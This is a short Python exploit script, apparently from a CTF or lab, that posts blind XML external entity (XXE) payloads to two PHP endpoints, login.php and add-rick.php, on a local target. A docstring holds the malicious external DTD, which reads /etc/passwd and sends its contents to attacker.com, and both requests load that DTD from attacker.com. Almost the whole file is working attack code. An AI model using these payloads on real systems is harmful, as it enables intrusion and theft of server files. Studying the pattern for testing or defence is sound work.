import requests

BASE_URL        = 'http://127.0.0.1'

sess = requests.Session()

headers = {
    "Content-Type": "application/xml"
}

"""
mal.dtd Content:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://attacker.com?x=%file;'>">
%eval;
%exfiltrate;

"""

# first XXE angle
r = sess.post(f'{BASE_URL}/login.php', headers=headers, data='<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/mal.dtd"> %xxe;]>', allow_redirects=False)

# second XXE angle
r = sess.post(f'{BASE_URL}/add-rick.php', headers=headers, data=f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/mal.dtd"> %xxe;]>')
